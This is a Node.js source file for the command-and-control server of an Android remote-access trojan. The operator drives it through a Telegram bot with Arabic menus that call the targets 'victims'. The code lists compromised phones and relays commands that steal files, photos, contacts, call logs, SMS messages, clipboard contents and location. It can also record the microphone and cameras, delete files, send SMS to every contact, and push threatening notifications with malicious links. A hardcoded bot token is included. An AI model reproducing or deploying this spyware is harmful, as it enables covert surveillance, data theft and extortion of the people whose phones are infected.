const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '8924997433:AAEYAMCDxus45Ahk8-V2K2GIjlFMsOECa1E'
const id = '8314983839'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل @VlP_12</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°•تم السحب من جهاز <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• رسالة من<b>${req.headers.model}</b> جهاز\n\n` + req.body[' @VlP_12'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• جهاز مخترق جديد\n\n` +
        `• نوع الجهاز : <b>${model}</b>\n` +
        `• البطاريه : <b>${battery}</b>\n` +
        `• اصدار الاندرويد : <b>${version}</b>\n` +
        `• سطوع الشاشه : <b>${brightness}</b>\n` +
        `• نوع الشبكه : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• جهاز غير متصل\n\n` +
            `• نوع الجهاز : <b>${model}</b>\n` +
            `• البطاريه : <b>${battery}</b>\n` +
            `• اصدار الاندرويد : <b>${version}</b>\n` +
            `• سطوع الشاشه : <b>${brightness}</b>\n` +
            `• نوع الشبكه : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• اكتب رقم لأرسال رسالة sms من جهاز الضحيه')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• اكتب نص الرساله\n\n' +
                '• اكتب نص الرسالة المرسله للرقم المحدد',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• اكتب نص الرساله')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة   @VlP_12،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• اكتب رساله لأرسالها لجميع جهات اتصال الضحيه')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• اكتب مسار مجلد لتحميل ما بداخله')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• اكتب مسار ملف لحذفه')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• تسجيل صوت الضحيه')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°•اكتب رساله لأظهارها بمنتصف الشاشه')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• اكتب اشعار تهديد للضحيه')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• اضف رابط ملغم او رابط لأي شي\n\n' +
                '• عند ضغط الضحيه علي الرساله سيتم فتح الرابط المضاف',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• اضف رابط ملغم او رابط لأي شي')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ارسل رابط الموسيقي')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مطور الملف المنحرف  لطلب نسخة  @VlP_12 \n\n' +
                '• اهلا بك في اول بوت اختراق هواتف بالوطن العربي\n\n' +
                '• البوت يعمل مثل برامج الرات ولكن بصيغه اسهل\n\n' +
                '• يمكنك اختراق اجهزه الاندرويد وسحب جميع ملفات الضحيه\n\n' +
                '• نحن غير مسؤولين عن اي استخدام ضار. لأعادة التشغيل اضغط /start .',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'فحص الاجهزه المخترقه') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• عفوا لا يوجد اجهزه مخترقه في الوقت الحالي\n\n' +
                    '• یرجي ارسال التطبيق الملغم للضحيه يحتي يتم اختراقه'
                )
            } else {
                let text = '°• الاجهزه المتصله :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• نوع الجهاز : <b>${value.model}</b>\n` +
                        `• البطاريه : <b>${value.battery}</b>\n` +
                        `• اصدار الاندرويد : <b>${value.version}</b>\n` +
                        `• سطوع الشاشه : <b>${value.brightness}</b>\n` +
                        `• نوع الشبكه : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'اظهار اوامر الاختراق') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• عفوا لا يوجد اجهزه مخترقه في الوقت الحالي\n\n' +
                    '• یرجي ارسال التطبيق الملغم للضحيه يحتي يتم اختراقه'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• اختر جهاز لأختراقه', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• اختر من القائمه لأختراق جهاز : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'قائمة التطبيقات', callback_data: `apps:${uuid}`},
                        {text: 'معلومات الضحيه', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'سحب ملفات وصور', callback_data: `file:${uuid}`},
                        {text: 'حذف ملف معين', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'سحب المحفوظات', callback_data: `clipboard:${uuid}`},
                        {text: 'تسجيل صوت للضحيه', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'تصوير الضحيه', callback_data: `camera_main:${uuid}`},
                        {text: 'تصوير الضحيه سيلفي', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'موقع الضحيه', callback_data: `location:${uuid}`},
                        {text: 'اظهار رساله', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'سحب المكالمات', callback_data: `calls:${uuid}`},
                        {text: 'سحب جهات الاتصال', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'اهتزاز جهاز الضحيه', callback_data: `vibrate:${uuid}`},
                        {text: 'ارسال اشعار', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'سحب رسائل جديده', callback_data: `messages:${uuid}`},
                        {text: 'ارساله رساله', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'تشغيل موسيقي', callback_data: `play_audio:${uuid}`},
                        {text: 'ايقاف موسيقي', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: 'ارسال رساله للجميع',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["فحص الاجهزه المخترقه"], ["اظهار اوامر الاختراق"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• اكتب رقم لأرسال رسالة sms من جهاز الضحيه\n\n' +
            '• اكتب رقم هاتف لأرسال له رساله يرجي كتابة الرقم متبوعا بنداء الدوله',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• اكتب رساله لأرسالها لجميع جهات اتصال الضحيه\n\n' +
            '• يجب اعطاء الاذن في التطبيق حتي تنجح معك',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• اكتب مسار مجلد لتحميل ما بداخله\n\n' +
            '• اكتب مسار مجلد 📂 لتحميل ما بداخله مثال <b> DCIM/Camera </b> سيتم سحب الصور.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• اكتب مسار ملف لحذفه\n\n' +
            '• اكتب اي مسار مثال <b> DCIM/Camera </b> سيتم حذف ما بداخله.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• تسجيل صوت الضحيه\n\n' +
            '• اكتب مدة تسجيل الريكورد بالثواني',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•اكتب رساله لأظهارها بمنتصف الشاشه\n\n' +
            '• سيتم اظهار الرساله بنصف شاشة الضحيه',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• اكتب اشعار تهديد للضحيه\n\n' +
            '• سيتم ارسال الاشعار بشريط الاشعارات',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ارسل رابط الموسيقي\n\n' +
            '• ملحوظه::  يجب ان يكون رابط تشغيل مباشر',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
